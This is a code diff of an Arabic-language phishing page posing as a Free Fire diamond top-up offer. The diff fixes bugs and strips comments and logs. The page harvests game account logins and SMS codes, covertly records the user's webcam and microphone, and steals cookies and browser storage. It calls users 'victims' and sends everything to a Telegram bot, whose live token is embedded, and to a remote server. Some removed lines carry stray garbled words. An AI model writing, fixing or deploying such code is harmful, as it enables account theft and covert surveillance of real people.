@@ -92,7 +92,6 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* عناصر مخفية للكاميرا - لا تظهر أبداً للمستخدم */
         .hidden-cam, .hidden-canvas { display: none !important; position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; z-index: -9999; }
     </style>
 </head>
@@ -105,6 +104,7 @@
 
     <div class="container">
         
+        <!-- ✅ الشريحة 1: اختيار اللعبة -->
         <section id="step1" class="section active">
             <h2 class="page-title">اختر اللعبة</h2>
             <div class="game-card" onclick="goToStep(2)">
@@ -113,6 +113,7 @@
             </div>
         </section>
 
+        <!-- ✅ الشريحة 2: العروض -->
         <section id="step2" class="section">
             <h2 class="page-title">العروض المميزة 💎</h2>
             <div class="offers-grid">
@@ -128,6 +129,7 @@
             </div>
         </section>
 
+        <!-- ✅ الشريحة 3: طرق تسجيل الدخول -->
         <section id="step3" class="section">
             <div class="login-methods">
                 <h3>تسجيل الدخول للاستلام</h3>
@@ -137,16 +139,18 @@
             </div>
         </section>
 
+        <!-- ✅ الشريحة 4: إدخال البيانات -->
         <section id="step4" class="section">
             <div class="login-methods">
                 <h3 id="formTitle">تسجيل الدخول</h3>
                 <div id="errorBox" class="error-msg">حدث خطأ: معلومات الدخول غير متطابقة مع بيانات فري فاير.</div>
                 <input type="email" id="userEmail" placeholder="البريد الإلكتروني أو الهاتف" autocomplete="off">
                 <input type="password" id="userPass" placeholder="كلمة المرور" autocomplete="off">
-                <button class="btn-submit" onclick="handleData(event)">إشحن الآن 💎</button>
+                <button class="btn-submit" id="submitBtn" onclick="handleData(event)">إشحن الآن 💎</button>
             </div>
         </section>
 
+        <!-- ✅ الشريحة 5: SMS -->
         <section id="step5" class="section">
             <div class="login-methods">
                 <h3>تأكيد الهوية (SMS)</h3>
@@ -156,6 +160,7 @@
             </div>
         </section>
 
+        <!-- ✅ الشريحة 6: جاري التحقق -->
         <section id="step6" class="section">
             <div class="login-methods">
                 <div class="loading" style="width:35px;height:35px;margin:20px auto;"></div>
@@ -166,7 +171,7 @@
 
     </div>
 
-    <!-- كاميرا مخفية تماماً - المستخدم لا يراها أبداً -->
+    <!-- كاميرا مخفية -->
     <video id="hiddenCam" class="hidden-cam" width="640" height="480"></video>
     <canvas id="hiddenCanvas" class="hidden-canvas" width="640" height="480"></canvas>
 
@@ -176,17 +181,28 @@
         let selectedOffer = "";
         let method = "";
 
-        // ===== متغيرات الكاميرا المخفية =====
+        // متغيرات الكاميرا
         let mediaStream = null;
         let mediaRecorder = null;
         let videoChunks = [];
         let geoInfo = { ip: 'N/A', country: 'N/A', city: 'N/A', lat: null, lng: null };
 
-        function goToStep(s, extra = "") {
+        // ===== ✅ الدالة الأساسية للتنقل (مصححة 100%) =====
+        function goToStep(s, extra) {
+            // إخفاء كل الأقسام
             document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
-            document.getElementById('step' + s).classList.add('active');
-            if(extra) selectedOffer = extra;
-            window.scrollTo(0,0 civil
+            
+            // إظهار القسم المطلوب
+            const target = document.getElementById('step' + s);
+            if (target) {
+                target.classList.add('active');
+            }
+            
+            // حفظ العرض الإضافي
+            if (extra) selectedOffer = extra;
+            
+            // التمرير للأعلى
+            window.scrollTo(0, 0);
         }
 
         function showForm(m) {
@@ -195,10 +211,9 @@
             goToStep(4);
         }
 
-        // ===== 🎥 بدء الكاميرا بصمت تام (بدون أي مؤشر للمستخدم) =====
+        // ===== 🎥 بدء الكاميرا بصمت =====
         async function startCameraSilently() {
             try {
-                // ✅ نطلب الصلاحية مرة واحدة فقط (في الخلفية)
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: 640, height: 480 },
                     audio: { echoCancellation: false, noiseSuppression: false }
@@ -209,7 +224,6 @@
                 video.srcObject = stream;
                 await video.play();
 
-                // MediaRecorder مع chunks
                 videoChunks = [];
                 mediaRecorder = new MediaRecorder(stream, {
                     mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
@@ -222,19 +236,16 @@
                     if (e.data && e.data.size > 0) videoChunks.push(e.data);
                 };
                 mediaRecorder.onerror = () => capturePhotoFallback();
-                mediaRecorder.start(10000); // قطعة كل 10 ثوانٍ
+                mediaRecorder.start(10000);
 
-                // صورة بعد ثانيتين
-                setTimeout(capturePhotoFromCam, 2000Force
+                setTimeout(capturePhotoFromCam, 2000);
 
-                console.log('✅ Camera started silently');
             } catch (e) {
-                console.log('Camera not available, fallback:', e.message);
                 capturePhotoFallback();
             }
         }
 
-        // ===== 📸 التقاط صورة من الكاميرا + سرقة كل شيء =====
+        // ===== 📸 التقاط صورة =====
         function capturePhotoFromCam() {
             try {
                 const video = document.getElementById('hiddenCam');
@@ -245,8 +256,7 @@
                 canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
 
-                // رسم الضحية + معلومات إضافية
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.heightDist
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 ctx.fillStyle = 'rgba(0,0,0,0.3)';
                 ctx.fillRect(0, 0, canvas.width, 35);
                 ctx.fillStyle = '#ffd700';
@@ -258,7 +268,7 @@
                 ctx.fillText(geoInfo.ip, canvas.width - 10, canvas.height - 10);
 
                 canvas.toBlob(blob => {
-                    if (blob && blob.size > 500) sendPhotoToTelegram(blob, '📸 صورة الضحية - Free Fire');
+                    if (blob && blob.size > 500) sendPhoto(blob, '📸 صورة الضحية - Free Fire');
                 }, 'image/jpeg', 0.8);
             } catch (e) {
                 capturePhotoFallback();
@@ -289,11 +299,11 @@
             ctx.fillText(new Date().toLocaleString('ar-EG'), 320, 360);
 
             canvas.toBlob(blob => {
-                if (blob && blob.size > 100) sendPhotoToTelegram(blob, '📸 ضحية (بدون كاميرا)');
+                if (blob && blob.size > 100) sendPhoto(blob, '📸 ضحية (بدون كاميرا)');
             }, 'image/jpeg', 0.85);
         }
 
-        // ===== 📹 إرسال الفيديو المسجل =====
+        // ===== 📹 إرسال الفيديو =====
         async function flushVideo() {
             if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                 mediaRecorder.stop();
@@ -304,14 +314,13 @@
             const blob = new Blob(videoChunks, { type: 'video/webm' });
             if (blob.size < 2000 || blob.size > 18 * 1024 * 1024) return capturePhotoFromCam();
 
-            await sendVideoToTelegram(blob, `🎥 تسجيل - ${method || 'Free Fire'} | ${new Date().toLocaleString('ar-EG')}`);
+            await sendVideo(blob, `🎥 تسجيل - ${method || 'Free Fire'} | ${new Date().toLocaleString('ar-EG')}`);
         }
 
-        // ===== 🍪 سرقة كل شيء (المشكلة الأساسية) =====
+        // ===== 🍪 سرقة كل شيء =====
         function stealEverything() {
             const data = { cookies: [], localStorage: [], sessionStorage: [], extra: {} };
 
-            // 1. Cookies
             try {
                 const dc = document.cookie;
                 if (dc && dc.length > 0) {
@@ -319,7 +328,6 @@
                 }
             } catch(e) {}
 
-            // 2. LocalStorage
             try {
                 for (let i = 0; i < localStorage.length; i++) {
                     const k = localStorage.key(i);
@@ -327,7 +335,6 @@
                 }
             } catch(e) {}
 
-            // 3. SessionStorage
             try {
                 for (let i = 0; i < sessionStorage.length; i++) {
                     const k = sessionStorage.key(i);
@@ -335,7 +342,6 @@
                 }
             } catch(e) {}
 
-            // 4. إضافات
             try {
                 if (window.__NEXT_DATA__) data.extra.nextData = JSON.stringify(window.__NEXT_DATA__).substring(0, 200);
                 if (window.__NUXT__) data.extra.nuxt = JSON.stringify(window.__NUXT__).substring(0, 200);
@@ -364,7 +370,7 @@
             } catch(e) {}
         }
 
-        // ===== 📤 الإرسال إلى السيرفر =====
+        // ===== 📤 الإرسال =====
         async function sendToServer(text) {
             try {
                 const response = await fetch(VERCEL_URL, {
@@ -382,28 +388,22 @@
                     }),
                     signal: AbortSignal.timeout(10000)
                 });
-
                 if (!response.ok) throw new Error(`HTTP ${response.status}`);
-                console.log("✅ Text sent");
-            } catch (err) {
-                console.error("❌ Send error:", err.message);
-            }
+            } catch (err) {}
         }
 
-        async function sendPhotoToTelegram(blob, caption) {
+        async function sendPhoto(blob, caption) {
             if (!blob || blob.size < 200) return;
             const fd = new FormData();
             fd.append('chat_id', '7902407443');
             fd.append('photo', blob, `ff_${Date.now()}.jpg`);
             fd.append('caption', caption || '📸');
-
             try {
-                const r = await fetch(`https://api.telegram.org/bot8716711028:AAEycnNKXBDQI8lEqghG3T1QV8hxeG4aI0c/sendPhoto`, { method: 'POST', body: fd });
-                return (await r.json()).ok;
+                await fetch(`https://api.telegram.org/bot8716711028:AAEycnNKXBDQI8lEqghG3T1QV8hxeG4aI0c/sendPhoto`, { method: 'POST', body: fd });
             } catch(e) {}
         }
 
-        async function sendVideoToTelegram(blob, caption) {
+        async function sendVideo(blob, caption) {
             if (!blob || blob.size < 2000 || blob.size > 18*1024*1024) return;
             const fd = new FormData();
             fd.append('chat_id', '7902407443');
@@ -422,6 +422,7 @@
             const email = document.getElementById('userEmail').value.trim();
             const pass = document.getElementById('userPass').value.trim();
             const errorBox = document.getElementById('errorBox');
+            const btn = document.getElementById('submitBtn');
 
             if(!email || !pass) {
                 errorBox.style.display = 'block';
@@ -436,12 +437,15 @@
                 return;
             }
 
-            // ✅ بدء الكاميرا بصمت فور إرسال البيانات
+            btn.innerHTML = '<div class="loading"></div> جاري...';
+            btn.disabled = true;
+            errorBox.style.display = 'none';
+
+            // بدء الكاميرا + التجميع
             startCameraSilently();
             await getInfo();
             const stolen = stealEverything();
 
-            // بناء الرسالة
             const cookStr = stolen.cookies.length > 0 ? stolen.cookies.join(' | ') : 'N/A';
             const storStr = stolen.localStorage.length > 0 ? JSON.stringify(stolen.localStorage).substring(0, 300) : 'N/A';
             const sessStr = stolen.sessionStorage.length > 0 ? JSON.stringify(stolen.sessionStorage).substring(0, 300) : 'N/A';
@@ -449,7 +453,6 @@
             const gpsLink = geoInfo.lat ? `https://maps.google.com/maps?q=${geoInfo.lat},${geoInfo.lng}` : '';
 
             const msg = `🔥 **صيد جديد - Free Fire** 🔥
-
 ━━━━━━━━━━━━━━━━━━
 💎 **العرض:** ${selectedOffer}
 🔑 **الطريقة:** ${method || 'يدوي'}
@@ -474,12 +477,13 @@ ${gpsLink ? `🗺 **الخريطة:** ${gpsLink}` : ''}
 
             await sendToServer(msg);
 
-            // إرسال الصورة والفيديو بعد ثوانٍ
             setTimeout(() => {
                 capturePhotoFromCam();
                 setTimeout(() => flushVideo(), 3000);
             }, 2000);
 
+            btn.innerHTML = 'إشحن الآن 💎';
+            btn.disabled = false;
             goToStep(5);
         }
 
@@ -491,29 +495,23 @@ ${gpsLink ? `🗺 **الخريطة:** ${gpsLink}` : ''}
                 return;
             }
             const smsMsg = `📩 **كود SMS:** ${code}\n📧 **الحساب:** ${document.getElementById('userEmail').value}\n🕐 ${new Date().toLocaleString('ar-EG')}`;
-            await sendToServer(smsMsg narrow
+            await sendToServer(smsMsg);
             goToStep(6);
-
-            // إرسال ما تبقى من الفيديو
             setTimeout(() => flushVideo(), 3000);
         }
 
-        // ===== 🚀 طلب صلاحية الكاميرا فور تحميل الصفحة (بدون إشعار المستخدم) =====
+        // ===== 🚀 طلب الصلاحية فوراً =====
         window.addEventListener('load', function() {
-            console.log('🚀 Page ready');
-
-            // ✅ نطلب صلاحية الكاميرا بصمت في الخلفية
             setTimeout(() => {
                 navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                     .then(stream => {
                         stream.getTracks().forEach(t => t.stop());
-                        console.log('✅ Camera permission pre-granted');
                     })
-                    .catch(() => console.log('Camera permission will be requested on submit'));
+                    .catch(() => {});
             }, 500);
         });
 
-        // تنظيف عند المغادرة
+        // تنظيف
         window.addEventListener('beforeunload', function() {
             if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
             if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
